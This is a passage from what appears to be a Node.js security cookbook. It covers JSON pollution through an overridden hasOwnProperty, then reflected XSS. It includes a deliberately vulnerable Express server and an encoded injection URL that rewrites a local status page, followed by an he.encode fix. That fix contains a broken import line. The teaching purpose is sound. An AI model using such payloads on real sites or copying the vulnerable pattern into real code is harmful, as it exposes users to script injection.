    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1500.1">
      greeting()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1501.1">
     function parses the request data as JSON and then aggregates the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1502.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1503.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1504.1">
      name
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1505.1">
     values that were supplied as request parameters.
    </span>
    <span class="koboSpan" id="kobo.1505.2">
     The aggregated string is returned as the response to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1506.1">
      the request.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1507.1">
     In our
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1508.1">
      server.js
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1509.1">
     file, we were using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1510.1">
      Object.prototype.hasOwnProperty()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1511.1">
     method, which is a built-in method available on all objects.
    </span>
    <span class="koboSpan" id="kobo.1511.2">
     However, it was possible to override the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1512.1">
      Object.prototype.hasOwnProperty()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1513.1">
     method by passing a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1514.1">
      hasOwnProperty
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1515.1">
     property in our JSON input.
    </span>
    <span class="koboSpan" id="kobo.1515.2">
     Because we set the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1516.1">
      hasOwnProperty
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1517.1">
     value to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1518.1">
      0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1519.1">
     in our JSON input, the server crashed when our code attempted to call
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1520.1">
      data.hasOwnProperty()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1521.1">
     – because that value had been overridden to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1522.1">
      0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1523.1">
     , rather than
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1524.1">
      a function.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1525.1">
     When a public-facing application accepts JSON input, it’s necessary to take steps in the application against JSON pollution attacks.
    </span>
    <span class="koboSpan" id="kobo.1525.2">
     One of the ways we covered for protecting applications from these attacks is by using a JSON Schema validator.
    </span>
    <span class="koboSpan" id="kobo.1525.3">
     It validated that the properties and values of our JSON input match those we expect.
    </span>
    <span class="koboSpan" id="kobo.1525.4">
     In this recipe, we used Ajv to define a
    </span>
    <a id="_idIndexMarker748">
    </a>
    <span class="koboSpan" id="kobo.1526.1">
     schema to accomplish this.
    </span>
    <span class="koboSpan" id="kobo.1526.2">
     Ajv
    </span>
    <a id="_idIndexMarker749">
    </a>
    <span class="koboSpan" id="kobo.1527.1">
     uses the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.1528.1">
      JSON Schema
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1529.1">
     (
    </span>
    <a href="https://json-schema.org/">
     <span class="koboSpan" id="kobo.1530.1">
      https://json-schema.org/
     </span>
    </a>
    <span class="koboSpan" id="kobo.1531.1">
     ) format to define
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1532.1">
      object schemas.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1533.1">
     Our schema required the JSON input to have a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1534.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1535.1">
     property and allow an optional
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1536.1">
      name
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1537.1">
     property.
    </span>
    <span class="koboSpan" id="kobo.1537.2">
     It also specified that both inputs must be of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1538.1">
      string
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1539.1">
     type.
    </span>
    <span class="koboSpan" id="kobo.1539.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1540.1">
      additionalProperties: false
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1541.1">
     configuration disallowed additional properties, causing the validation to fail when we supplied
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1542.1">
      hasOwnProperty
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1543.1">
     in the JSON input, making it impossible to override the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1544.1">
       Object.prototype.hasOwnProperty
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1545.1">
      method.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-298">
    <a id="_idTextAnchor305">
    </a>
    <span class="koboSpan" id="kobo.1546.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.1547.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1548.1">
       Anticipating malicious input
      </span>
     </em>
     <span class="koboSpan" id="kobo.1549.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1550.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1551.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1552.1">
       Guarding against cross-site scripting
      </span>
     </em>
     <span class="koboSpan" id="kobo.1553.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1554.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1555.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1556.1">
       Preventing cross-site request forgery
      </span>
     </em>
     <span class="koboSpan" id="kobo.1557.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1558.1">
       this chapter
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-299">
    <a id="_idTextAnchor306">
    </a>
    <span class="koboSpan" id="kobo.1559.1">
     Guarding against cross-site scripting
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1560.1">
     XSS attacks are
    </span>
    <a id="_idIndexMarker750">
    </a>
    <span class="koboSpan" id="kobo.1561.1">
     client-side injection attacks where malicious scripts are injected into websites.
    </span>
    <span class="koboSpan" id="kobo.1561.2">
     XSS vulnerabilities are very dangerous as they can compromise
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1562.1">
      trusted websites.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1563.1">
     In this recipe, we’re going to demonstrate an XSS vulnerability and learn how we can protect against them.
    </span>
    <span class="koboSpan" id="kobo.1563.2">
     We’ll be using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1564.1">
      he
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1565.1">
     (
    </span>
    <a href="https://www.npmjs.com/package/he">
     <span class="koboSpan" id="kobo.1566.1">
      https://www.npmjs.com/package/he
     </span>
    </a>
    <span class="koboSpan" id="kobo.1567.1">
     )
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1568.1">
      npm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1569.1">
     module to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1570.1">
      do so.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-300">
    <a id="_idTextAnchor307">
    </a>
    <span class="koboSpan" id="kobo.1571.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1572.1">
     In this recipe, we’ll create an Express.js server that’s vulnerable to an XSS attack.
    </span>
    <span class="koboSpan" id="kobo.1572.2">
     To do so, we must create the vulnerable
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1573.1">
      Express.js server:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1574.1">
      First, let’s create a directory named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1575.1">
       express-xss
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1576.1">
      to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1577.1">
       work in:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1578.1">$ mkdir express-xss</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1579.1">$ cd express-xss</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1580.1">$ npm init --yes</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1581.1">
      Now, we need to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1582.1">
       install
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1583.1">
        express
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1584.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1585.1">$ npm install express</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1586.1">
      Create a file where you’ll store the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1587.1">
       Express.js server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1588.1">$ touch server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1589.1">
      Add the following to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1590.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1591.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1591.2">
      This will create a server that renders a simple HTML web page that’s susceptible to an
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1592.1">
       XSS attack:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1593.1">
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; {
  const { previous, lang, token } = req.query;
  getServiceStatus((status) =&gt; {
    res.send(`
      &lt;h1&gt;Service Status&lt;/h1&gt;
      &lt;div id=status&gt;
        ${status}
      &lt;/div&gt;
      &lt;div&gt;
      &lt;a href="${previous}${token}/${lang}"&gt;Back&lt;/a&gt;
      &lt;/div&gt;
    `);
  });
});
const getServiceStatus = (callback) =&gt; {
  const status = 'All systems are running.';
  callback(status);
};
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</span></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1594.1">
     Now, we’re ready to
    </span>
    <a id="_idIndexMarker751">
    </a>
    <span class="koboSpan" id="kobo.1595.1">
     move on to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1596.1">
      this recipe.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-301">
    <a id="_idTextAnchor308">
    </a>
    <span class="koboSpan" id="kobo.1597.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1598.1">
     In this recipe, we’ll learn how to exploit and mitigate
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1599.1">
      XSS attacks:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1600.1">
      First, start the server with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1601.1">
       following command:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1602.1">$ node server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1603.1">
      The server is emulating a service status web page.
     </span>
     <span class="koboSpan" id="kobo.1603.2">
      The web page accepts three parameters:
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1604.1">
       previous
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1605.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1606.1">
       token
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1607.1">
      , and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1608.1">
       lang
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1609.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1609.2">
      It’s common practice to have parameters such as these injected into URLs in real-world web applications.
     </span>
     <span class="koboSpan" id="kobo.1609.3">
      Navigate to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1610.1">
       http://localhost:3000/?previous=/&amp;token=TOKEN&amp;lang=en
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1611.1">
      ; expect to see the
     </span>
     <a id="_idIndexMarker752">
     </a>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1612.1">
       following output:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer043">
     <span class="koboSpan" id="kobo.1613.1">
      <img alt="Figure 9.5 – Demonstrative service status web page showing “All systems are running.”" src="image/B19212_09_05.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.1614.1">
     Figure 9.5 – Demonstrative service status web page showing “All systems are running.”
    </span>
   </p>
   <ol>
    <li value="3">
     <span class="koboSpan" id="kobo.1615.1">
      Now, we can craft an XSS attack.
     </span>
     <span class="koboSpan" id="kobo.1615.2">
      We will craft a URL that will inject parameters to change the service status message to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1616.1">
       All systems are down!
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1617.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1617.2">
      We’re aiming to inject the following JavaScript via the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1618.1">
       URL parameters:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1619.1">
document.getElementById("status").innerHTML="All systems are down!";</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1620.1">
      We can inject
     </span>
     <a id="_idIndexMarker753">
     </a>
     <span class="koboSpan" id="kobo.1621.1">
      this script using the following
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1622.1">
       HTTP request:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1623.1">
http://localhost:3000/?previous=%22%3E%3Cscri&amp;token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&amp;lang=script%3E%20%3Ca%20href=%22/</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1624.1">
      Now, the web page will show
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1625.1">
       All systems are down!
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1626.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1626.2">
      So, visitors to our legitimate service status page will see a malicious message.
     </span>
     <span class="koboSpan" id="kobo.1626.3">
      These attacks typically send the malicious URL to an unsuspecting consumer of
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1627.1">
       the website:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer044">
     <span class="koboSpan" id="kobo.1628.1">
      <img alt="Figure 9.6 – Demonstrative service status web page showing “All systems are down!”" src="image/B19212_09_06.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.1629.1">
     Figure 9.6 – Demonstrative service status web page showing “All systems are down!”
    </span>
   </p>
   <ol>
    <li value="6">
     <span class="koboSpan" id="kobo.1630.1">
      We can see the code
     </span>
     <a id="_idIndexMarker754">
     </a>
     <span class="koboSpan" id="kobo.1631.1">
      that’s been injected by using the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1632.1">
       View Page Source
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1633.1">
      interface in your browser.
     </span>
     <span class="koboSpan" id="kobo.1633.2">
      If you’re on macOS, you should be able to use the
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1634.1">
       Command
      </span>
     </em>
     <span class="koboSpan" id="kobo.1635.1">
      +
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1636.1">
       Option
      </span>
     </em>
     <span class="koboSpan" id="kobo.1637.1">
      +
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1638.1">
       U
      </span>
     </em>
     <span class="koboSpan" id="kobo.1639.1">
      shortcut to open the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1640.1">
       View Page
      </span>
     </strong>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.1641.1">
        Source
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1642.1">
       interface:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer045">
     <span class="koboSpan" id="kobo.1643.1">
      <img alt="Figure 9.7 – View Page Source showing the injected JavaScript" src="image/B19212_09_07.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.1644.1">
     Figure 9.7 – View Page Source showing the injected JavaScript
    </span>
   </p>
   <ol>
    <li value="7">
     <span class="koboSpan" id="kobo.1645.1">
      To fix the application, we
     </span>
     <a id="_idIndexMarker755">
     </a>
     <span class="koboSpan" id="kobo.1646.1">
      need to escape/sanitize the input.
     </span>
     <span class="koboSpan" id="kobo.1646.2">
      Copy the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1647.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1648.1">
      file to a file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1649.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1650.1">
        fixed-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1651.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1652.1">$ cp server.js fixed-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1653.1">
      To escape or sanitize the input, we’ll use a module named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1654.1">
       he
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1655.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1655.2">
      Install
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1656.1">
       he
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1657.1">
      from the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1658.1">
        npm
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1659.1">
       registry:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1660.1">$ npm install he</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1661.1">
      We need to add the import for
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1662.1">
       he
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1663.1">
      to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1664.1">
       fixed-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1665.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1665.2">
      Add the following line of code below the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1666.1">
       express
      </span>
     </strong>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1667.1">
       module import:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1668.1">const express = require('he');</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1669.1">
      Then, we can set the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1670.1">
       href
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1671.1">
      value using
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1672.1">
       he
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1673.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1673.2">
      Alter the route handler
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1674.1">
       as follows:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1675.1">
app.get('/', (req, res) =&gt; {
  const { previous, lang, token } = req.query;
  getServiceStatus((status) =&gt; {
</span><strong class="bold"><span class="koboSpan" id="kobo.1676.1">    const href =</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1677.1">      he.encode(`${previous}${token}/${lang}`);</span></strong><span class="koboSpan" id="kobo.1678.1">
    res.send(`
        &lt;h1&gt;Service Status&lt;/h1&gt;
        &lt;div id=status&gt;
          ${status}
        &lt;/div&gt;
        &lt;div&gt;
</span><strong class="bold"><span class="koboSpan" id="kobo.1679.1">        &lt;a href="${href}"&gt;Back&lt;/a&gt;</span></strong><span class="koboSpan" id="kobo.1680.1">
        &lt;/div&gt;
      `);
  });
});</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1681.1">
      Start the
     </span>
     <a id="_idIndexMarker756">
     </a>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1682.1">
       fixed server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1683.1">$ node fixed-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1684.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1685.1">
      Attempt to access the malicious
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1686.1">
       URL again:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1687.1">
http://localhost:3000/?previous=%22%3E%3Cscri&amp;token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&amp;lang=script%3E%20%3Ca%20href=%22/</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1688.1">
      Observe that this time, we get the expected
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1689.1">
       All systems are running.
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1690.1">
      output.
     </span>
     <span class="koboSpan" id="kobo.1690.2">
      Our injection attack no
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1691.1">
       longer works:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer046">
     <span class="koboSpan" id="kobo.1692.1">
      <img alt="Figure 9.8 – Demonstrative service status web page showing “All systems are running.”" src="image/B19212_09_08.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.1693.1">
     Figure 9.8 – Demonstrative service status web page showing “All systems are running.”
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1694.1">
     With that, we’ve learned
    </span>
    <a id="_idIndexMarker757">
    </a>
    <span class="koboSpan" id="kobo.1695.1">
     how to use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1696.1">
      he
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1697.1">
     module to prevent an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1698.1">
      XSS attack.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-302">
    <a id="_idTextAnchor309">
    </a>
    <span class="koboSpan" id="kobo.1699.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1700.1">
     XSS attacks are client-side injection attacks where malicious scripts are injected into trusted websites.
    </span>
    <span class="koboSpan" id="kobo.1700.2">
     The general flow of an XSS attack is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1701.1">
      as follows:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1702.1">
      Malicious input enters the application – typically via a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1703.1">
       web request.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1704.1">
      The input is rendered as dynamic content on the web page because the input hasn’t been
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1705.1">
       sanitized appropriately.
      </span>
     </span>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1706.1">
     The two main types of XSS attacks are persistent XSS and reflected XSS.
    </span>
    <span class="koboSpan" id="kobo.1706.2">
     With persistent XSS attacks, malicious data is injected into a persistence layer of the system.
    </span>
    <span class="koboSpan" id="kobo.1706.3">
     For example, it could be injected into a field within
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1707.1">
      a database.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1708.1">
     Reflected XSS attacks are reliant on a single interaction with the server – for example, sending a single HTTP request.
    </span>
    <span class="koboSpan" id="kobo.1708.2">
     The attack demonstrated in this recipe was a reflected XSS attack sent over
    </span>
    <a id="_idIndexMarker758">
    </a>
    <span class="koboSpan" id="kobo.1709.1">
     an HTTP request containing
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1710.1">
      malicious input.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1711.1">
     The exploit in this recipe was due to the way the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1712.1">
      href
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1713.1">
     value was formulated for the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.1714.1">
      Back
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1715.1">
     link.
    </span>
    <span class="koboSpan" id="kobo.1715.2">
     We started the injection process by assigning the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1716.1">
      %22%3E%3Cscri
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1717.1">
     value, which, when decoded, is equal to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1718.1">
      "&gt;&lt;scri
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1719.1">
     .
    </span>
    <span class="koboSpan" id="kobo.1719.2">
     This value closes an HTML anchor tag and starts an HTML script element that’s ready to inject our script.
    </span>
    <span class="koboSpan" id="kobo.1719.3">
     The remaining values are set to inject the following code into the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1720.1">
      web page:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.1721.1">
"&gt;&lt;script&gt;document.getElementById("status").innerHTML="All systems are down!";&lt;/script&gt; &lt;a href="</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1722.1">
     Note that the attack wouldn’t have worked with a single parameter as many modern browsers have built-in XSS auditors to prevent the obvious injection of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1723.1">
      &lt;
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1724.1">
       script&gt;
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1725.1">
      tags.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.1726.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.1727.1">
     You can use Node.js’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1728.1">
      decodeURI()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1729.1">
     method to decode encoded URIs.
    </span>
    <span class="koboSpan" id="kobo.1729.2">
     For example,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1730.1">
      $ node -p "decodeURI('%22%3E%3Cscri')"
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1731.1">
     would
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1732.1">
      output
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1733.1">
       "&gt;&lt;scri
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1734.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1735.1">
     We fixed this vulnerability using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1736.1">
      he
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1737.1">
     module.
    </span>
    <span class="koboSpan" id="kobo.1737.2">
     We use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1738.1">
      he
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1739.1">
     module’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1740.1">
      encode()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1741.1">
     function to do so.
    </span>
    <span class="koboSpan" id="kobo.1741.2">
     This function accepts text that’s expected to be HTML or XML input and returns it in escaped form.
    </span>
    <span class="koboSpan" id="kobo.1741.3">
     This is how we sanitize the input and stop the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1742.1">
      &lt;script&gt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1743.1">
     tag from being injected into the
    </span>
    <span class="No-Break">
